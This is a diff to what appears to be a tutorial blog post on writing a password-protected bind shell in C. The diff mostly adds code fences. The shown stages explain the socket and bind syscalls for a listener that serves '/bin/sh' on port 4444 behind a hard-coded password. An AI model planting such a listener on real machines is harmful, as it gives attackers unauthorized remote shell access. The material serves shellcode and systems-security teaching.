@@ -47,19 +47,25 @@ int main()
         // Change arguments as required - last argument is password
         char *arguments[] = { "/bin/sh", 0, "4444", "YOLOOOOOOO" };
         char buf[16];
-}```
+}
+```
 
 Creating the socket is handled by the socket syscall. Syscall stands for System Call and is used to make requests from the user space into the Linux Kernel. Referring to the man page for socket, it requires 3 arguments:
 Protocol Family - We will be using AF_INET (IPv4 Internet Protocols)
 Communication Type - We will use SOCK_STREAM (TCP)
 The third argument does not concern us so we will only pass 0
+
+```C
 sock = socket(AF_INET, SOCK_STREAM, 0);
+```
 The return value for the above syscall will be a file descriptor for the new socket.
 Stage 2 - Binding the newly created socket to a port
 In this step we will assign an address to the newly created socket. We will use the bind syscall for this. The bind syscall again takes 3 arguments:
 The socket to bind to - We will use our new socket "sock"
 Data structure of the server/victim, which is essentially the IP Address and port that the bind syscall needs to use. This data structure consists of 4 members that are each explained below.
 Length of the data structure passed in argument 2. This was declared during the skeleton code stage.
+
+```C
 server.sin_family = AF_INET; //Address Family
 server.sin_port = htons(atoi(arguments[2])); //Network Byte order of the port to bind to. 
                                      //htons converts host byte order to network byte order
@@ -67,6 +73,8 @@ server.sin_addr.s_addr = INADDR_ANY; //Netowrk interfaces to bind to, INADDR_ANY
 bzero(&server.sin_zero, 8); // 8 zero bytes of padding
 
 bind(sock, (struct sockaddr *)&server, sockaddr_len);
+```
+
 Stage 3 - Listen for incoming connections on the newly created socket
 The listen syscall accepts 2 arguments:
 File descriptor of new socket in Stage 1
